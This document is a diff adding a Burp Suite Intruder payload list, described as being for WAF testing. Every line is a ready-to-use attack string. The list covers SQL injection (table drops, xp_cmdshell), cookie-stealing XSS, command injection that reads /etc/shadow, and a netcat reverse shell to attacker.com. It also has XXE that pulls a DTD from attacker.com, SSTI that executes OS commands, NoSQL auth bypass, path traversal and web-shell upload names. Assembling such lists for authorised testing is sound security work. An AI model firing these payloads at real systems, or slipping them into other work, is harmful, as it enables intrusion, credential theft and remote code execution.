@@ -1,0 +1,211 @@
+# Burp Suite Payload List for WAF Testing
+# Import this file in Burp Intruder → Payloads → Load
+
+# SQL Injection Payloads
+' OR '1'='1
+' OR 1=1--
+' OR 'x'='x
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+'; DROP TABLE users--
+admin'--
+' AND 1=1--
+' AND 1=2--
+' OR '1'='1'/*
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' OR SLEEP(5)--
+' AND SLEEP(5)--
+' WAITFOR DELAY '00:00:05'--
+'; EXEC xp_cmdshell('dir')--
+' OR EXISTS(SELECT * FROM users)--
+
+# XSS Payloads
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<svg/onload=alert(1)>
+<svg/onload=alert('XSS')>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<iframe src="javascript:alert('XSS')">
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=`javascript:alert("XSS")`>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<BODY ONLOAD=alert('XSS')>
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+<svg><script>alert(1)</script></svg>
+<math><mi xlink:href="data:x,<script>alert(1)</script>">
+<embed src="data:text/html,<script>alert(1)</script>">
+
+# Command Injection Payloads
+; ls -la
+; cat /etc/passwd
+| whoami
+| id
+| ls
+& dir
+&& dir
+`id`
+`whoami`
+$(whoami)
+$(id)
+$(ls -la)
+; sleep 5
+| sleep 5
+& timeout 5
+&& timeout 5
+;cat /etc/shadow
+|cat /etc/shadow
+;nc -e /bin/sh attacker.com 4444
+|nc -e /bin/sh attacker.com 4444
+
+# Path Traversal Payloads
+../
+../../
+../../../
+../../../../
+../../../../../
+../../../../../../
+../../../../../../../
+../../../../../../../../
+../../../../../../../../../
+../../../../../../../../../../
+../../../../../../../../../../../
+../../../../../../../../../../../../
+../../../../../../../../../../../../../
+../../../../../../../../../../../../../../
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+..%2F
+..%2F..%2F
+..%2F..%2F..%2F
+..%5c
+..%5c..%5c
+..%5c..%5c..%5c
+%2e%2e%2f
+%2e%2e%2f%2e%2e%2f
+%2e%2e%2f%2e%2e%2f%2e%2e%2f
+....//
+....//....//
+....//....//....//
+..;/
+..;/..;/
+..;/..;/..;/
+
+# LDAP Injection Payloads
+*
+*)(&
+*)(uid=*)
+*)(|(uid=*))
+admin*)(&(password=*)
+admin*))(|(password=*
+*)(objectClass=*)
+)(cn=*
+))(|(cn=*
+
+# XML Injection / XXE Payloads
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">]><foo>&xxe;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>
+
+# SSTI (Server-Side Template Injection) Payloads
+{{7*7}}
+{{7*'7'}}
+{{config}}
+{{config.items()}}
+{{''.class.mro()[1].subclasses()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+${7*7}
+${7*'7'}
+<%= 7*7 %>
+#{7*7}
+#{ 7*7 }
+${{7*7}}
+@(7*7)
+
+# NoSQL Injection Payloads
+{"$gt":""}
+{"$ne":null}
+{"$nin":[]}
+'; return true; var foo='
+'; return this.a == 'admin'; var foo='
+' || 1==1//
+' || '1'=='1
+' && this.password.match(/.*/)//
+{"username": {"$ne": null}, "password": {"$ne": null}}
+
+# File Upload Payloads (for testing file upload endpoints)
+test.php.jpg
+test.jpg.php
+test.php%00.jpg
+test.php%0a.jpg
+test.php;.jpg
+shell.phtml
+shell.php3
+shell.php4
+shell.php5
+shell.phps
+shell.pht
+
+# HTTP Header Injection Payloads (for testing if WAF checks headers)
+\r\nSet-Cookie: admin=true
+\r\n\r\n<script>alert(1)</script>
+%0d%0aSet-Cookie: admin=true
+%0d%0a%0d%0a<script>alert(1)</script>
+
+# CRLF Injection
+%0d%0aLocation: http://attacker.com
+%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK
+
+# Unicode/UTF-8 Bypass Attempts
+%u003cscript%u003ealert(1)%u003c/script%u003e
+%uff1cscript%uff1ealert(1)%uff1c/script%uff1e
+＜script＞alert(1)＜/script＞
+
+# Null Byte Injection
+%00
+test%00.php
+../../etc/passwd%00
+
+# Special Characters
+test'
+test"
+test`
+test;
+test|
+test&
+test<
+test>
+test(
+test)
+test{
+test}
+test[
+test]
+test$
+test!
+test@
+test#
+test%
+test^
+test*
+test+
+test=
+test~
